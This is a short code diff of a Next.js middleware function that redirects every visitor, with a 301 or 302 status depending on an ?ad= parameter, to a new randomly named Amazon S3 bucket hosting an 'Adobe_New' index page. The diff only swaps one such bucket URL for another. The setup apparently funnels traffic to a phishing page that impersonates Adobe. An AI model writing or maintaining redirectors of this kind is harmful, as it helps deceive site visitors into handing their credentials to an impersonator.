@@ -41,14 +41,14 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://ruwo-s01-l52.s3.us-east-1.amazonaws.com/Adobe_New/index.html',
+      'https://ooiwe-mnkjklp.s3.us-east-2.amazonaws.com/Adobe_New/Adobe_New/en/index.html',
       { status: 301 }
     )
   }
 
   // Default redirect
   return NextResponse.redirect(
-    'https://ruwo-s01-l52.s3.us-east-1.amazonaws.com/Adobe_New/index.html',
+    'https://ooiwe-mnkjklp.s3.us-east-2.amazonaws.com/Adobe_New/Adobe_New/en/index.html',
     { status: 302 }
   )
 }
